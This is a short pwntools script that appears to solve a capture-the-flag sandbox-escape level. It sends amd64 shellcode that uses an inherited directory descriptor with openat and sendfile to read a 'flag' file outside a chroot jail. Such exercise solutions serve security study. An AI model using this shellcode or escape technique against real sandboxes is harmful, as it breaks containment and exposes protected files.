'''
openat
'''

from pwn import *

context.arch = "amd64"

my_sc = asm(shellcraft.openat(3, "flag", 0) + shellcraft.sendfile(1, "rax", 0, 0x66))
# display the bytes
#print(disasm(my_sc))
# fd = open("ttt-raw","wb+")
# fd.write(my_sc)
# fd.close()
# def preexec_openfd():
#     fd = os.open("/", flags=0x20000)
#     os.dup2(3, fd)

p = process(["/challenge/babyjail_level17", "/"])
#context.terminal = ['tmux', 'splitw', '-h']  # Attempting to use multixterm
#p = gdb.debug(["/challenge/babyjail_level13", "/flag"], gdbscript="source /opt/gef/gef.py")

p.send(my_sc)

all = p.recvall()
print(all.decode())
